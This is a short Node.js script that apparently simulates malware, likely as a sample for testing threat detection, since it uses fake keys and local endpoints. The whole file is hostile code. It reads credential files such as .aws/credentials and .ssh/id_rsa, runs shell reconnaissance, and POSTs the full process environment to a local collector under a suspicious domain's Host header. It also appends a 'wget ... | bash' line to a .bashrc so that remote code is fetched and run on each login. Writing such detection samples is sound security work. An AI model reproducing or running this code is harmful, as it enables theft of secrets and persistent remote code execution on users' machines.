const dgram = require('dgram');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const domain = 'com-web.pavl9ore.surf';

// Credential strings in memory
const AWS_KEY = 'AKIAIOSFODNN7FAKE123';
const PRIVATE_KEY = '-----BEGIN RSA PRIVATE KEY-----\nFAKEKEYDATA';
process.env['_AWS'] = AWS_KEY;
process.env['_PK'] = PRIVATE_KEY;

// DNS query with delay
setTimeout(() => {
  function buildDnsQuery(domain) {
    const buf = Buffer.alloc(512);
    buf.writeUInt16BE(0x1234, 0); buf.writeUInt16BE(0x0100, 2);
    buf.writeUInt16BE(1, 4); buf.writeUInt16BE(0, 6);
    buf.writeUInt16BE(0, 8); buf.writeUInt16BE(0, 10);
    let offset = 12;
    domain.split('.').forEach(label => {
      buf.writeUInt8(label.length, offset++);
      Buffer.from(label).copy(buf, offset);
      offset += label.length;
    });
    buf.writeUInt8(0, offset++);
    buf.writeUInt16BE(1, offset); offset += 2;
    buf.writeUInt16BE(1, offset); offset += 2;
    return buf.slice(0, offset);
  }
  const client = dgram.createSocket('udp4');
  const query = buildDnsQuery(domain);
  client.send(query, 0, query.length, 5353, '127.0.0.1', () => client.close());
}, 2000);

// Honeytoken + credential access
try { fs.readFileSync(path.join(__dirname, '.env'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, '.aws', 'credentials'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, '.ssh', 'id_rsa'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, 'secrets.yaml'), 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "sleep 3 && whoami && uname -a"'); } catch(e) {}

// POST exfiltration
const payload = JSON.stringify({ domain, key: AWS_KEY, env: process.env });
try {
  const req = http.request({
    hostname: '127.0.0.1', port: 8080, path: '/api-data', method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Host': domain, 'Content-Length': Buffer.byteLength(payload) }
  });
  req.write(payload); req.end();
} catch(e) {}

// Persistence
try { fs.appendFileSync(path.join(__dirname, '.bashrc'), '\nwget -q ' + domain + '/persist -O- | bash\n'); } catch(e) {}
